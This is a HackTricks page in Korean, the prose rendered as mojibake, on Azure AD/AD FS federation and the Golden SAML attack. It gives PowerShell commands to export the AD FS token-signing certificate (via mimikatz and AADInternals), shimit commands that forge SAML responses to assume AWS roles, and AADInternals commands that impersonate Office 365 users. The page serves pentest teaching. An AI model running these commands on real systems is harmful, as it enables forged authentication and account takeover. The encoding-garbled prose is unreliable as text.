# Az - ì—°ë§¹

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ **ì œë¡œë¶€í„° ì˜ì›…ê¹Œì§€ AWS í•´í‚¹ ë°°ìš°ê¸°**!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜ PDFë¡œ HackTricksë¥¼ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ì…í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [Discord ê·¸ë£¹](https://discord.gg/hRep4RUj7f)** ë˜ëŠ” [í…”ë ˆê·¸ë¨ ê·¸ë£¹](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **í•´í‚¹ ìš”ë ¹ì„ ê³µìœ í•˜ë ¤ë©´ PRì„ ì œì¶œí•˜ì—¬** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œë¥¼ í™•ì¸í•˜ì„¸ìš”.

</details>

## ê¸°ë³¸ ì •ë³´

[ë¬¸ì„œì—ì„œ:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-fed)**ì—°ë§¹(Federation)**ì€ **ì‹ ë¢°ë¥¼ í™•ë¦½í•œ ë„ë©”ì¸ë“¤ì˜ ëª¨ìŒ**ì…ë‹ˆë‹¤. ì‹ ë¢° ìˆ˜ì¤€ì€ ë‹¤ì–‘í•  ìˆ˜ ìˆì§€ë§Œ ì¼ë°˜ì ìœ¼ë¡œ **ì¸ì¦**ì„ í¬í•¨í•˜ë©° ê±°ì˜ í•­ìƒ **ì¸ê°€**ë¥¼ í¬í•¨í•©ë‹ˆë‹¤. ì „í˜•ì ì¸ ì—°ë§¹ì€ **ê³µìœ  ì•¡ì„¸ìŠ¤**ë¥¼ ìœ„í•´ **ì‹ ë¢°ë¥¼ í™•ë¦½í•œ ì—¬ëŸ¬ ì¡°ì§**ì„ í¬í•¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì˜¨í”„ë ˆë¯¸ìŠ¤ í™˜ê²½ì„ **Azure ADì™€ ì—°ë§¹**í•˜ê³  ì´ ì—°ë§¹ì„ ì¸ì¦ ë° ê¶Œí•œ ë¶€ì—¬ì— ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ë¡œê·¸ì¸ ë°©ë²•ì€ ëª¨ë“  ì‚¬ìš©ì **ì¸ì¦ì´ ì˜¨í”„ë ˆë¯¸ìŠ¤ì—ì„œ ë°œìƒ**í•¨ì„ ë³´ì¥í•©ë‹ˆë‹¤. ì´ ë°©ë²•ì„ ì‚¬ìš©í•˜ë©´ ê´€ë¦¬ìê°€ ë” ì—„ê²©í•œ ìˆ˜ì¤€ì˜ ì•¡ì„¸ìŠ¤ ì œì–´ë¥¼ êµ¬í˜„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **AD FS** ë° PingFederateì™€ì˜ ì—°ë§¹ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.

<figure><img src="../../../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

ê¸°ë³¸ì ìœ¼ë¡œ ì—°ë§¹ì—ì„œ ëª¨ë“  **ì¸ì¦**ì€ **ì˜¨í”„ë ˆë¯¸ìŠ¤** í™˜ê²½ì—ì„œ ë°œìƒí•˜ë©° ì‚¬ìš©ìëŠ” ì‹ ë¢°í•˜ëŠ” ëª¨ë“  í™˜ê²½ì—ì„œ SSOë¥¼ ê²½í—˜í•©ë‹ˆë‹¤. ë”°ë¼ì„œ ì‚¬ìš©ìëŠ” **ì˜¨í”„ë ˆë¯¸ ìê²© ì¦ëª…**ì„ ì‚¬ìš©í•˜ì—¬ **í´ë¼ìš°ë“œ** ì‘ìš© í”„ë¡œê·¸ë¨ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ë³´ì•ˆ ì£¼ì¥ í‘œì‹œ ì–¸ì–´(SAML)**ì€ ì œê³µì ê°„ì— ëª¨ë“  ì¸ì¦ ë° ê¶Œí•œ ë¶€ì—¬ **ì •ë³´ë¥¼ êµí™˜**í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤.

ì–´ë–¤ ì—°ë§¹ ì„¤ì •ì—ì„œëŠ” ì„¸ ê°€ì§€ ë‹¹ì‚¬ìê°€ ìˆìŠµë‹ˆë‹¤:

* ì‚¬ìš©ì ë˜ëŠ” í´ë¼ì´ì–¸íŠ¸
* ì‹ ì› ì œê³µì(IdP)
* ì„œë¹„ìŠ¤ ì œê³µì(SP)

(ì´ë¯¸ì§€ ì¶œì²˜: https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<figure><img src="../../../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

1. ë¨¼ì € ì‚¬ìš©ìê°€ ì‘ìš© í”„ë¡œê·¸ë¨(ì„œë¹„ìŠ¤ ì œê³µì ë˜ëŠ” SP, ì˜ˆ: AWS ì½˜ì†” ë˜ëŠ” vSphere ì›¹ í´ë¼ì´ì–¸íŠ¸)ì— ì•¡ì„¸ìŠ¤í•©ë‹ˆë‹¤. íŠ¹ì • êµ¬í˜„ì— ë”°ë¼ í´ë¼ì´ì–¸íŠ¸ë¥¼ ì§ì ‘ IdP(ì‹ ì› ì œê³µì)ë¡œ ì´ë™ì‹œì¼œ ì´ ë‹¨ê³„ë¥¼ ìƒëµí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
2. ê·¸ëŸ° ë‹¤ìŒ SPëŠ” ì‚¬ìš©ì ì¸ì¦ì„ ìœ„í•´ ì ì ˆí•œ IdP(ì˜ˆ: AD FS, Okta)ë¥¼ ì‹ë³„í•©ë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ SPëŠ” SAML(Security Assertion Markup Language) AuthnRequestë¥¼ ì‘ì„±í•˜ê³  í´ë¼ì´ì–¸íŠ¸ë¥¼ ì„ íƒí•œ IdPë¡œ ë‹¤ì‹œ ë¼ìš°íŒ…í•©ë‹ˆë‹¤.
3. IdPê°€ ì‚¬ìš©ìë¥¼ ì¸ì¦í•©ë‹ˆë‹¤. ì¸ì¦ í›„ IdPëŠ” SAMLResponseë¥¼ ì‘ì„±í•˜ê³  ì‚¬ìš©ìë¥¼ í†µí•´ SPë¡œ ì „ë‹¬í•©ë‹ˆë‹¤.
4. ë§ˆì§€ë§‰ìœ¼ë¡œ SPëŠ” SAMLResponseë¥¼ í‰ê°€í•©ë‹ˆë‹¤. IdPì™€ì˜ ì‹ ë¢° ê´€ê³„ë¥¼ ë‚˜íƒ€ë‚´ëŠ” ì„±ê³µì ì¸ ìœ íš¨ì„± ê²€ì‚¬ê°€ ìˆìœ¼ë©´ ì‚¬ìš©ìì—ê²Œ ì•¡ì„¸ìŠ¤ ê¶Œí•œì´ ë¶€ì—¬ë©ë‹ˆë‹¤. ì´ë¡œì¨ ë¡œê·¸ì¸ í”„ë¡œì„¸ìŠ¤ê°€ ì™„ë£Œë˜ì–´ ì‚¬ìš©ìê°€ ì„œë¹„ìŠ¤ë¥¼ í™œìš©í•  ìˆ˜ ìˆê²Œ ë©ë‹ˆë‹¤.

**SAML ì¸ì¦ ë° ì¼ë°˜ì ì¸ ê³µê²©ì— ëŒ€í•´ ìì„¸íˆ ì•Œì•„ë³´ë ¤ë©´:**

{% embed url="https://book.hacktricks.xyz/pentesting-web/saml-attacks" %}

## Pivoting

* AD FSëŠ” ì£¼ì¥ ê¸°ë°˜ ì‹ ì› ëª¨ë¸ì…ë‹ˆë‹¤.
* "..ì£¼ì¥ì€ ì‚¬ìš©ìì— ëŒ€í•´ ë§Œë“¤ì–´ì§„ ì£¼ì¥(ì˜ˆ: ì´ë¦„, ì‹ ì›, ê·¸ë£¹)ìœ¼ë¡œ, ì¸í„°ë„· ì–´ë””ì—ì„œë“  ì£¼ì¥ ê¸°ë°˜ ì• í”Œë¦¬ì¼€ì´ì…˜ì— ì•¡ì„¸ìŠ¤ ê¶Œí•œì„ ë¶€ì—¬í•˜ëŠ” ë° ì£¼ë¡œ ì‚¬ìš©ë©ë‹ˆë‹¤."
* ì‚¬ìš©ìì˜ ì£¼ì¥ì€ SAML í† í° ë‚´ì— ì‘ì„±ë˜ê³  IdPì— ì˜í•´ ê¸°ë°€ì„±ì„ ì œê³µí•˜ê¸° ìœ„í•´ ì„œëª…ë©ë‹ˆë‹¤.
* ì‚¬ìš©ìëŠ” ImmutableIDì— ì˜í•´ ì‹ë³„ë©ë‹ˆë‹¤. ì´ëŠ” ì „ì—­ì ìœ¼ë¡œ ê³ ìœ í•˜ë©° Azure ADì— ì €ì¥ë©ë‹ˆë‹¤.
* ImmutableIDëŠ” ì‚¬ìš©ìì˜ GUIDì—ì„œ íŒŒìƒë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* ìì„¸í•œ ì •ë³´: [https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims)

**Golden SAML ê³µê²©:**

* ADFSì—ì„œ SAML ResponseëŠ” í† í° ì„œëª… ì¸ì¦ì„œì— ì˜í•´ ì„œëª…ë©ë‹ˆë‹¤.
* ì¸ì¦ì„œê°€ Compromiseë˜ë©´ Azure ADì— ë™ê¸°í™”ëœ **ëª¨ë“  ì‚¬ìš©ìë¡œ ì¸ì¦**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤!
* PTA ë‚¨ìš©ê³¼ ë§ˆì°¬ê°€ì§€ë¡œ ì‚¬ìš©ìì˜ ë¹„ë°€ë²ˆí˜¸ ë³€ê²½ì´ë‚˜ MFAëŠ” ì˜í–¥ì„ ë¯¸ì¹˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ì™œëƒí•˜ë©´ ì¸ì¦ ì‘ë‹µì„ ìœ„ì¡°í•˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.
* ì¸ì¦ì„œëŠ” DA ê¶Œí•œìœ¼ë¡œ AD FS ì„œë²„ì—ì„œ ì¶”ì¶œí•œ ë‹¤ìŒ ì¸í„°ë„·ì— ì—°ê²°ëœ ì¥ì¹˜ì—ì„œ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* ìì„¸í•œ ì •ë³´: [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

### Golden SAML

**ì‹ ì› ì œê³µì(IdP)**ê°€ ì‚¬ìš©ì ë¡œê·¸ì¸ì„ ìŠ¹ì¸í•˜ê¸° ìœ„í•´ **SAMLResponse**ë¥¼ ìƒì„±í•˜ëŠ” ê³¼ì •ì´ ì¤‘ìš”í•©ë‹ˆë‹¤. IdPì˜ íŠ¹ì • êµ¬í˜„ì— ë”°ë¼ **ì‘ë‹µ**ì€ **IdPì˜ ê°œì¸ í‚¤**ë¥¼ ì‚¬ìš©í•˜ì—¬ **ì„œëª…** ë˜ëŠ” **ì•”í˜¸í™”**ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì ˆì°¨ëŠ” SPê°€ SAMLResponseì˜ ì‹ ë¢°ì„±ì„ í™•ì¸í•˜ì—¬ ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” IdPì—ì„œ ë°œê¸‰ë˜ì—ˆìŒì„ ë³´ì¥í•©ë‹ˆë‹¤.

ì´ëŠ” [ê³¨ë“  í‹°ì¼“ ê³µê²©](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket)ê³¼ ìœ ì‚¬í•˜ë©°, ì‚¬ìš©ìì˜ ì‹ ì›ê³¼ ê¶Œí•œì„ ì¸ì¦í•˜ëŠ” í‚¤(KRBTGTì˜ ê²½ìš° ê³¨ë“  í‹°ì¼“, ê³¨ë“  SAMLì˜ ê²½ìš° í† í° ì„œëª… ê°œì¸ í‚¤)ë¥¼ ì¡°ì‘í•˜ì—¬ ì¸ì¦ ê°ì²´(TGT ë˜ëŠ” SAMLResponse)ë¥¼ ìœ„ì¡°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ì–´ë–¤ ì‚¬ìš©ìë“  í‰ë‚´ë¥¼ ë‚´ì–´ SPì— ë¬´ë‹¨ ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ê³¨ë“  SAMLì€ ë‹¤ìŒê³¼ ê°™ì€ ì´ì ì„ ì œê³µí•©ë‹ˆë‹¤:

* **ì›ê²©ìœ¼ë¡œ ìƒì„±**ë  ìˆ˜ ìˆìœ¼ë©° í•´ë‹¹ ë„ë©”ì¸ì´ë‚˜ ì—°ë§¹ì˜ ì¼ë¶€ê°€ ë˜ì–´ì•¼ í•  í•„ìš”ê°€ ì—†ìŠµë‹ˆë‹¤.
* **ì´ì¤‘ ì¸ì¦(2FA)**ì´ í™œì„±í™”ëœ ìƒíƒœì—ì„œë„ íš¨ê³¼ì ì…ë‹ˆë‹¤.
* í† í° ì„œëª… **ê°œì¸ í‚¤ê°€ ìë™ìœ¼ë¡œ ê°±ì‹ ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤**.
* ì‚¬ìš©ìì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ ë³€ê²½í•´ë„ ì´ë¯¸ ìƒì„±ëœ SAMLì„ ë¬´íš¨í™”í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.

#### AWS + AD FS + Golden SAML

[Active Directory Federation Services (AD FS)](https://docs.microsoft.com/en-us/previous-versions/windows/server-2008/bb897402\(v=msdn.10\))ëŠ” ì‹ ë¢°í•˜ëŠ” ë¹„ì¦ˆë‹ˆìŠ¤ íŒŒíŠ¸ë„ˆ(ì—°ë§¹) ê°„ì— **ì‹ ì› ì •ë³´ë¥¼ ì•ˆì „í•˜ê²Œ êµí™˜**í•˜ëŠ” ë° ë„ì›€ì´ ë˜ëŠ” Microsoft ì„œë¹„ìŠ¤ì…ë‹ˆë‹¤. ì´ëŠ” ë„ë©”ì¸ ì„œë¹„ìŠ¤ê°€ ì—°ë§¹ ë‚´ì—ì„œ ë‹¤ë¥¸ ì„œë¹„ìŠ¤ ì œê³µìì™€ ì‚¬ìš©ì ì‹ ì›ì„ ê³µìœ í•  ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤.

AWSê°€ ì—°ë§¹ ë‚´ì˜ ì¹¨í•´ëœ ë„ë©”ì¸ì„ ì‹ ë¢°í•˜ëŠ” ê²½ìš°, ì´ ì·¨ì•½ì ì„ í™œìš©í•˜ì—¬ **AWS í™˜ê²½ì—ì„œ ì–´ë–¤ ê¶Œí•œì´ë“  íšë“**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ê³µê²©ì—ëŠ” **SAML ê°ì²´ì— ì„œëª…í•˜ëŠ” ë° ì‚¬ìš©ëœ ê°œì¸ í‚¤**ê°€ í•„ìš”í•˜ë©°, ì´ëŠ” ê³¨ë“  í‹°ì¼“ ê³µê²©ì—ì„œ KRBTGTê°€ í•„ìš”í•œ ê²ƒê³¼ ìœ ì‚¬í•©ë‹ˆë‹¤. AD FS ì‚¬ìš©ì ê³„ì •ì— ì•¡ì„¸ìŠ¤í•˜ë©´ ì´ ê°œì¸ í‚¤ë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ê³¨ë“  SAML ê³µê²©ì„ ì‹¤í–‰í•˜ê¸° ìœ„í•œ ìš”êµ¬ ì‚¬í•­ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

* **í† í° ì„œëª… ê°œì¸ í‚¤**
* **IdP ê³µê°œ ì¸ì¦ì„œ**
* **IdP ì´ë¦„**
* **ì—­í•  ì´ë¦„(ê°€ì •í•  ì—­í• )**
* ë„ë©”ì¸\ì‚¬ìš©ì ì´ë¦„
* AWSì—ì„œì˜ ì—­í•  ì„¸ì…˜ ì´ë¦„
* Amazon ê³„ì • ID

_êµµê²Œ í‘œì‹œëœ í•­ëª©ë§Œ í•„ìˆ˜ì…ë‹ˆë‹¤. ë‚˜ë¨¸ì§€ëŠ” ì›í•˜ëŠ” ëŒ€ë¡œ ì‘ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤._

**ê°œì¸ í‚¤**ë¥¼ íšë“¤í•˜ê¸° ìœ„í•´ì„œëŠ” **AD FS ì‚¬ìš©ì ê³„ì •**ì— ì•¡ì„¸ìŠ¤í•´ì•¼ í•©ë‹ˆë‹¤. ê±°ê¸°ì„œ [mimikatz](https://github.com/gentilkiwi/mimikatz)ì™€ ê°™ì€ ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ê°œì¸ í‚¤ë¥¼ **ê°œì¸ ì €ì¥ì†Œì—ì„œ ë‚´ë³´ë‚¼** ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ë¥¸ í•„ìš”í•œ ì •ë³´ë¥¼ ìˆ˜ì§‘í•˜ê¸° ìœ„í•´ Microsoft.Adfs.Powershell ìŠ¤ëƒ…ì¸ì„ ì‚¬ìš©í•˜ì—¬ ë‹¤ìŒê³¼ ê°™ì´ ë¡œê·¸ì¸ëœ ìƒíƒœë¡œ ADFS ì‚¬ìš©ìë¡œ ë¡œê·¸ì¸í•´ì•¼ í•©ë‹ˆë‹¤:
```powershell
# From an "AD FS" session
# After having exported the key with mimikatz

# ADFS Public Certificate
[System.Convert]::ToBase64String($cer.rawdata)

# IdP Name
(Get-ADFSProperties).Identifier.AbsoluteUri

# Role Name
(Get-ADFSRelyingPartyTrust).IssuanceTransformRule
```
ëª¨ë“  ì •ë³´ë¥¼ ê°–ê³  ìˆìœ¼ë©´ [**shimit**](https://github.com/cyberark/shimit)ë¥¼ ì‚¬ìš©í•˜ì—¬ í”¼í•´ìë¡œ ìœ„ì¥í•  ìˆ˜ ìˆëŠ” ìœ íš¨í•œ SAMLResponseë¥¼ ìŠì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:**
```bash
# Apply session for AWS cli
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
# idp - Identity Provider URL e.g. http://server.domain.com/adfs/services/trust
# pk - Private key file full path (pem format)
# c - Certificate file full path (pem format)
# u - User and domain name e.g. domain\username (use \ or quotes in *nix)
# n - Session name in AWS
# r - Desired roles in AWS. Supports Multiple roles, the first one specified will be assumed.
# id - AWS account id e.g. 123456789012

# Save SAMLResponse to file
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

### ì˜¨í”„ë ˆë¯¸ìŠ¤ -> í´ë¼ìš°ë“œ
```powershell
# With a domain user you can get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# On AD FS server execute as administrator
Get-AdfsProperties | select identifier

# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.
# You need to use the one from AzureAD.
# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate a user to to access cloud apps
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```
í´ë¼ìš°ë“œ ì „ìš© ì‚¬ìš©ìì˜ ImmutableIDë¥¼ ìƒì„±í•˜ê³  ê·¸ë“¤ì„ í‘œì ˆí•˜ëŠ” ê²ƒë„ ê°€ëŠ¥í•©ë‹ˆë‹¤.
```powershell
# Create a realistic ImmutableID and set it for a cloud only user
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate the user
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
## ì°¸ê³  ìë£Œ

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed)
* [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ **ì œë¡œë¶€í„° ì˜ì›…ê¹Œì§€ AWS í•´í‚¹ ë°°ìš°ê¸°**!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ PDFë¡œ ë‹¤ìš´ë¡œë“œí•˜ê³  ì‹¶ë‹¤ë©´** [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* ğŸ’¬ [**ë””ìŠ¤ì½”ë“œ ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks** ë° **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ ìš”ë ¹ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>
